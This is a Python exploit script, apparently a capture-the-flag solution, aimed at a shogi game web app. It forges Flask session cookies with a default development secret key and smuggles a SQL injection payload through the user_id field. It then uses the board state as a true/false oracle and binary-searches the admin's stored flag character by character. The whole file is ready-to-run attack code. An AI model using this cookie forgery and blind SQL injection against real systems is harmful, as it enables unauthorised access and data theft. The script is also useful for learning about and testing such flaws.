import sys
import uuid
import time
import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

STARTING_SFEN = "lnsgkgsnl/1r5b1/ppppppppp/9/9/9/PPPPPPPPP/1B5R1/LNSGKGSNL b - 1"

def get_session_serializer(secret_key="dev-secret-key-change-in-production"):
    app = Flask("shogi-exploit")
    app.secret_key = secret_key
    return SecureCookieSessionInterface().get_signing_serializer(app)

def create_session_cookie(serializer, user_id_payload):
    return serializer.dumps({"user_id": user_id_payload})

def normalize_url(target_url):
    target = target_url.strip().rstrip('/')
    if not target.startswith("http://") and not target.startswith("https://"):
        if "localhost" in target or "127.0.0.1" in target:
            target = f"http://{target}"
        else:
            target = f"https://{target}"
    return target

def check_oracle(target_url, serializer, condition, max_retries=5):
    """
    TRUE/FALSE oracle using 2-step approach:
    
    1. POST /game/move with injected user_id. The SQL injection stores move '7g7f'
       for user_id=rand_prefix ONLY if condition is TRUE. If FALSE, json_extract error
       is swallowed but nothing is stored.
    
    2. GET /game/state with a CLEAN cookie for user_id=rand_prefix.
       - TRUE  => moves were stored => board is NOT at starting position
       - FALSE => no moves stored  => board is at starting position (SFEN matches default)
    """
    rand_prefix = uuid.uuid4().hex[:16]

    # Step 1: Injection request
    # The payload injects an extra row: (rand_prefix, '7g7f', now) if condition TRUE
    # If FALSE, json_extract('{','$') throws an error, INSERT fails, nothing stored.
    inject_payload = (
        f"{rand_prefix}', "
        f"(SELECT CASE WHEN ({condition}) THEN '7g7f' ELSE json_extract('{{', '$') END), "
        f"datetime('now'))--"
    )
    inject_cookie = create_session_cookie(serializer, inject_payload)

    for attempt in range(1, max_retries + 1):
        try:
            s = requests.Session()
            s.headers.update({"Content-Type": "application/json"})

            # Step 1: trigger injection
            s.cookies.set("session", inject_cookie)
            s.post(f"{target_url}/game/move", json={"move": "7g7f"}, timeout=12)

            # Step 2: check board state with clean cookie for rand_prefix user
            clean_cookie = create_session_cookie(serializer, rand_prefix)
            s.cookies.clear()
            s.cookies.set("session", clean_cookie)
            state_resp = s.get(f"{target_url}/game/state", timeout=12)

            if state_resp.status_code == 200:
                sfen = state_resp.json().get("sfen", "")
                # If condition was TRUE, the '7g7f' move was stored and board moved
                return sfen != STARTING_SFEN
            return False

        except (requests.exceptions.SSLError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt == max_retries:
                print(f"\n[!] Network/SSL error after {max_retries} attempts: {e}")
                return False
            time.sleep(1)
        except Exception as e:
            print(f"\n[!] Unexpected error: {e}")
            return False

    return False


def exploit(target_url="http://localhost:8001", secret_key="dev-secret-key-change-in-production"):
    target_url = normalize_url(target_url)
    print(f"[*] Target: {target_url}")
    print(f"[*] Using Secret Key: {secret_key}")

    serializer = get_session_serializer(secret_key)

    # Verify connectivity
    print("[*] Testing server connection...")
    try:
        r = requests.get(f"{target_url}/game/state", timeout=15)
        if r.status_code != 200:
            print(f"[-] Target responded with HTTP {r.status_code}: {r.text[:100]}")
            return
        print(f"[+] Server reachable. Starting SFEN: {r.json().get('sfen','?')[:40]}")
    except Exception as e:
        print(f"[-] Could not connect to {target_url}: {e}")
        return

    # Validate oracle
    print("[*] Validating oracle (1=1 should be TRUE, 1=2 should be FALSE)...")
    t1 = check_oracle(target_url, serializer, "1=1")
    t2 = check_oracle(target_url, serializer, "1=2")
    print(f"[*] Oracle: 1=1 => {t1}, 1=2 => {t2}")
    if t1 == t2:
        print("[-] Oracle validation FAILED! Both conditions returned the same result.")
        print("[-] The board-state oracle may not be working. Check server logs.")
        return
    print("[+] Oracle is working correctly!")

    # Step 1: Find flag length
    print("[*] Determining flag length...")
    low, high, flag_len = 1, 200, 0
    while low <= high:
        mid = (low + high) // 2
        cond = f"length((SELECT move FROM game_moves WHERE user_id='admin' LIMIT 1)) >= {mid}"
        if check_oracle(target_url, serializer, cond):
            flag_len = mid
            low = mid + 1
        else:
            high = mid - 1

    if flag_len == 0:
        print("[-] Could not determine flag length.")
        print("[-] Possible reasons: Server not vulnerable, wrong SECRET_KEY, or admin row missing.")
        return

    print(f"[+] Found flag length: {flag_len}")

    # Step 2: Extract flag character by character
    print("[*] Extracting flag characters...")
    flag = ""
    for idx in range(1, flag_len + 1):
        low, high, char_code = 32, 126, 32
        while low <= high:
            mid = (low + high) // 2
            cond = (
                f"unicode(substr((SELECT move FROM game_moves WHERE user_id='admin' LIMIT 1), {idx}, 1)) >= {mid}"
            )
            if check_oracle(target_url, serializer, cond):
                char_code = mid
                low = mid + 1
            else:
                high = mid - 1
        flag += chr(char_code)
        sys.stdout.write(f"\r[+] Flag so far: {flag}")
        sys.stdout.flush()

    print(f"\n\n[🎉] SUCCESS! Flag: {flag}")
    return flag


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8001"
    key = sys.argv[2] if len(sys.argv) > 2 else "dev-secret-key-change-in-production"
    exploit(target, key)
